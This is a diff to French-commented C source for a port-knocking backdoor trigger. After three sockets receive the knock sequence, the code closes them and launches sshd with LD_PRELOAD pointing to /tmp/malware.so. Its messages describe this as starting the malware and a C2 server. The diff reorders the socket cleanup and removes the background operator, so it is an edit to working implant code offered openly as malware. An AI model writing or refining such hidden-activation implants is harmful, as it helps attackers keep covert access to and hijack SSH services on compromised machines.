@@ -9,8 +9,8 @@
 #define KNOCK_PORT_3 3333
 
 void start_malware() {
-    printf("[INFO] ✅ Séquence Knock reçue, lancement du malware...\n");
-    system("LD_PRELOAD=/tmp/malware.so /usr/sbin/sshd -D &"); // Lancer le malware en arrière-plan
+    printf("[INFO] Séquence Knock reçue, lancement du malware...\n");
+    system("LD_PRELOAD=/tmp/malware.so /usr/sbin/sshd -D "); // Lancer le malware
 }
 
 int main() {
@@ -53,14 +53,14 @@ int main() {
 
     // Vérification si la séquence complète est reçue
     if (knock_received[0] && knock_received[1] && knock_received[2]) {
+
+        for (int i = 0; i < 3; i++) {
+            close(sock[i]);  // Ferme chaque socket avant de lancer le malware
+        }
+
         start_malware();
     } else {
         printf("[ERROR] Séquence incorrecte, serveur C2 NON lancé !\n");
-    }
-
-    // Fermer les sockets
-    for (int i = 0; i < 3; i++) {
-        close(sock[i]);
     }
 
     return 0;
